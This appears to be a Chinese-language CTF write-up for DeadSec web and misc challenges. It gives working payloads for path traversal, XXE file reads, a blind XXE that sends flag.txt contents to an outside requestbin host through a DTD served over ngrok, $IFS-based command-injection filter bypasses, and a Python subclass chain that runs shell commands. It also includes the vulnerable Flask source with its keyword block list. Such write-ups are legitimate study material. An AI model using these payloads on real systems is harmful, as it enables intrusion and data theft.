
# web
### crush

`https://b15c7ef41b05eb0eca3cea2b.deadsec.quest/hacking?hack=rename&lettername=202cb962ac59075b964b07152d234b70&rename=../../../../../../../../../flag.txt`
`https://b15c7ef41b05eb0eca3cea2b.deadsec.quest/readletter?lettername=202cb962ac59075b964b07152d234b70`

### XXE 1
#xxe
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230521180946.png)

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE input [
<!ELEMENT xmen ANY>
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt">]>
<user><username>&xxe;</username></user>
```

### XXE2
#xxe 
与上一题一样,但是这次不会回显
盲xxe
*payload*
```xml
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "https://84fb-111-18-39-51.ngrok-free.app/passwd.dtd">
%remote;%int;%send;
]>
```

passwd.dtd
```xml

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://http.requestbin.buuoj.cn/1qybk5u1?%file;'>">
%eval;
%exfiltrate;
```


### Bing
#命令注入

读取文件时会显示 You can read flag!!!,猜测是根据命令执行结果来waf
*payload*

`host=base64$IFS/fl[a]g.[t]xt`

###### 源码
```python
#!/usr/bin/env python3
import subprocess

from flask import Flask, request, render_template, redirect


app = Flask(__name__)

black_list = [" ", "cat" , "ls" , "flag.txt" , "*", "'" , "\"" , "@", "\t" , "\n", "fla"]

def check_input(cmd):
    for word in black_list:
        if word in cmd:
            return False
    return True
@app.route('/')
def index():
    return render_template('index.html')


@app.route('/flag', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'{host}'
        if check_input(cmd) == False:
             return render_template('ping_result.html', data='Oh no no, dont hack my website :)))')
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            if ("dead" in output.decode('utf-8')):
                return render_template('ping_result.html', data='You can read flag !!!')
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'error when executing command: {cmd}')

    return render_template('ping.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```


### FRSS
限制本地读取`hehe.txt`文件,且存在长度限制
*payload*
`url=0.0.0.0/hehe.txt`
### Trailblazer
看不懂捏

---
发现报错界面会显示一张图片,`/images/now`来显示当前时间,加上`==` 后回显`false`  又因为是python猜测为now类
*payload*

```shell
https://42729b7dae4ede716f4a9e87.deadsec.quest/images/now.__class__.mro()[1].__subclasses__()[352]('head${IFS}f*',shell=True,stdout=-1).communicate()[0][0:].strip
```

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230522131601.png)


# reverse

# pwn

# crypto

# Misc
### crashPython
让一个python程序产生`segmentation fault`
gpt!
```python
import ctypes

class MyPointer(ctypes.Structure):
    _fields_ = [("ptr", ctypes.c_void_p)]

my_ptr = MyPointer()
my_ptr.ptr = 0b0

libc = ctypes.CDLL("libc.so.6")
libc.strcpy(my_ptr, "Hello,World!")
```

---
## *相关wp*




2023-05-20   21:18